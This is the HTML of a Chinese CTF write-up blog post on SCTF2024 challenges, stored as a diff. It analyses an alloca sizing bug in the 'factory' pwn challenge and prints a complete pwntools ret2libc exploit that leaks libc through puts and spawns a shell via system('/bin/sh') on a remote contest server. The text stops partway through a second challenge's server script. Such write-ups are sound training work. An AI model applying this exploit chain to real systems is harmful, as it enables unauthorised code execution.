@@ -1,0 +1,638 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="SCTF2024"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="交流,进步"><meta property="og:type" content="article"><meta property="og:title" content="SCTF2024"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/wp%E5%90%88%E9%9B%86/sctf2024/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-10-09 15:46:30 +0800 CST"><meta property="article:modified_time" content="2024-10-09 15:46:30 +0800 CST"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"sctf2024","permalink":"https://zp9080.github.io/post/wp%E5%90%88%E9%9B%86/sctf2024/","title":"SCTF2024","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>SCTF2024 - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#factory>factory</a></li><li><a href=#gocomplier>gocomplier</a><ul><li><a href=#自己的解法>自己的解法</a></li><li><a href=#官方wp>官方WP</a></li></ul></li><li><a href=#vmcode>vmcode</a></li><li><a href=#c_or_go>c_or_go</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/wp%E5%90%88%E9%9B%86/sctf2024/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="SCTF2024"><meta itemprop=description content="[TOC]"></span><header class=post-header><h1 class=post-title itemprop="name headline">SCTF2024
+<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/WP%e5%90%88%e9%9b%86/SCTF2024.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2024-10-09 15:46:30 +0800 CST" itemprop="dateCreated datePublished" datetime="2024-10-09 15:46:30 +0800 CST">2024-10-09
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/wp%E5%90%88%E9%9B%86 itemprop=url rel=index><span itemprop=name>WP合集</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
+</span><span class=post-meta-item-text>字数：</span>
+<span>5095</span>
+</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>11分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=busuanzi_value_page_pv data-path=/post/wp%E5%90%88%E9%9B%86/sctf2024/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>[TOC]</p><h1 id=factory>factory
+<a class=header-anchor href=#factory></a></h1><ul><li><p>题目内容如下 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/59.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/60.png alt></p></li><li><p>没细看根本没有看出来漏洞，好像就是输入n，然后用alloca来调整栈空间，把数据读到栈上，然后printf打印这些值的和</p></li><li><p>但是注意到一个很奇怪的地方 v0 = 0x10 * ((4 * n + 0x17) / 0x10uLL); 为什么v0不是8*n，64位条件下，栈应该是8字节对齐</p></li><li><p>计算发现一些问题
+size不严格。因此n=0x28时，实际上应该时alloca(0x140)，但这样计算只有0xb0，因此有溢出 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos4/61.png alt></p></li><li><p>因此有如下利用思路</p></li></ul><p>这里的栈溢出可以覆盖到buf和i的值</p><p>第一个思路是覆盖buf为一个任意地址，那么就可以任意地址写任意值，但是这里无法控制返回地址，所以放弃这个思路。</p><p>第二个思路就是这个覆盖会先覆盖到i的值，再覆盖到buf的值，所以可以覆盖i为一个特别的值，跳过对buf的覆盖，这样就可以通过栈溢出覆盖到返回地址，进而就行ret2libc就行,更具体地可以看exp中的注释</p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>ctypes</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p = process(&#34;/home/zp9080/PWN/pwn&#34;)</span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *0x4013D2&#39;)</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>=</span>remote(<span style=color:#b44>&#39;1.95.81.93&#39;</span>,<span style=color:#666>57777</span>)
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#b44>&#34;/home/zp9080/PWN/pwn&#34;</span>)
+</span></span><span style=display:flex><span>libc<span style=color:#666>=</span>elf<span style=color:#666>.</span>libc 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#b *$rebase(0x14F5)</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
+</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *0x401402&#39;</span>)
+</span></span><span style=display:flex><span>    pause()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># dbg()</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;How many factorys do you want to build: &#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0x28</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>0x16</span>):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span>i<span style=color:#666>+</span><span style=color:#666>1</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0x16</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#i</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>0x17</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0x1d</span><span style=color:#666>-</span><span style=color:#666>1</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#ret_addr</span>
+</span></span><span style=display:flex><span>pop_rdi<span style=color:#666>=</span><span style=color:#666>0x401563</span>
+</span></span><span style=display:flex><span>ret<span style=color:#666>=</span><span style=color:#666>0x000000000040101a</span>
+</span></span><span style=display:flex><span>puts<span style=color:#666>=</span><span style=color:#666>0x4010B0</span>
+</span></span><span style=display:flex><span>puts_got<span style=color:#666>=</span><span style=color:#666>0x404018</span>
+</span></span><span style=display:flex><span>vuln<span style=color:#666>=</span><span style=color:#666>0x401303</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>30</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(pop_rdi))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>31</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(puts_got))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>32</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(puts))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>33</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(vuln))
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>0x28</span><span style=color:#666>-</span><span style=color:#666>33</span>):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts_addr <span style=color:#666>=</span> u64(p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x7f</span><span style=color:#b44>&#39;</span>)[<span style=color:#666>-</span><span style=color:#666>6</span>:]<span style=color:#666>.</span>ljust(<span style=color:#666>8</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>))
+</span></span><span style=display:flex><span>libcbase <span style=color:#666>=</span> puts_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>symbols[<span style=color:#b44>&#39;puts&#39;</span>]
+</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#b44>&#39;system&#39;</span>]
+</span></span><span style=display:flex><span>bin_addr <span style=color:#666>=</span> libcbase <span style=color:#666>+</span> <span style=color:#a2f>next</span>(libc<span style=color:#666>.</span>search(<span style=color:#b44>b</span><span style=color:#b44>&#39;/bin/sh&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>0x16</span>):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span>i<span style=color:#666>+</span><span style=color:#666>1</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0x16</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#i</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>0x17</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0x1d</span><span style=color:#666>-</span><span style=color:#666>1</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#ret_addr</span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>30</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(pop_rdi))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>31</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(bin_addr))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>32</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(ret))
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory</span><span style=color:#b68;font-weight:700>{</span><span style=color:#666>33</span><span style=color:#b68;font-weight:700>}</span><span style=color:#b44>&#34;</span>,<span style=color:#a2f>str</span>(system_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>0x28</span><span style=color:#666>-</span><span style=color:#666>33</span>):
+</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>f</span><span style=color:#b44>&#34;factory&#34;</span>,<span style=color:#a2f>str</span>(<span style=color:#666>0</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h1 id=gocomplier>gocomplier
+<a class=header-anchor href=#gocomplier></a></h1><h2 id=自己的解法>自己的解法
+<a class=header-anchor href=#%e8%87%aa%e5%b7%b1%e7%9a%84%e8%a7%a3%e6%b3%95></a></h2><p>这里是直接用的一个github项目进行的改编
+<a href=https://github.com/wa-lang/ugo title=https://github.com/wa-lang/ugo rel="noopener external nofollow noreferrer" target=_blank class=exturl>https://github.com/wa-lang/ugo
+<i class="fa fa-external-link-alt"></i></a></p><p>µGo 是迷你Go语言玩具版本，只保留最基本的int数据类型、变量定义和函数、分支和循环等最基本的特性。µGo 有以下的关键字：var、func、if、for、return。此外有一个int内置的数据类型</p><p>先分析server.py这个文件，这样我们可以知道怎么进行的交互</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#080;font-style:italic>#! /usr/bin/python3</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>os</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>sys</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>subprocess</span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>threading</span> <span style=color:#a2f;font-weight:700>import</span> Thread
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>shutil</span> <span style=color:#a2f;font-weight:700>import</span> copy
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>uuid</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>socket_print</span>(string):
+</span></span><span style=display:flex><span>    <span style=color:#a2f>print</span>(<span style=color:#b44>&#34;=====&#34;</span>, string, flush<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>run_challenge</span>(filename):
+</span></span><span style=display:flex><span>    socket_print(<span style=color:#b44>&#34;start complete!&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>try</span>: 
+</span></span><span style=display:flex><span>        cmd <span style=color:#666>=</span> <span style=color:#b44>&#34;./ir2bin.sh&#34;</span>
+</span></span><span style=display:flex><span>        subprocess<span style=color:#666>.</span>run(cmd, shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, timeout<span style=color:#666>=</span><span style=color:#666>60</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>except</span> subprocess<span style=color:#666>.</span>CalledProcessError <span style=color:#a2f;font-weight:700>as</span> e:
+</span></span><span style=display:flex><span>        socket_print(<span style=color:#b44>&#34;stopping&#34;</span>)
+</span></span><span style=display:flex><span>        clean_file(filename)
+</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    socket_print(<span style=color:#b44>&#34;run binary&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>try</span>: 
+</span></span><span style=display:flex><span>        subprocess<span style=color:#666>.</span>run(<span style=color:#b44>&#34;./hello&#34;</span>, shell<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>True</span>, timeout<span style=color:#666>=</span><span style=color:#666>60</span>)
+</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>except</span> subprocess<span style=color:#666>.</span>CalledProcessError <span style=color:#a2f;font-weight:700>as</span> e:
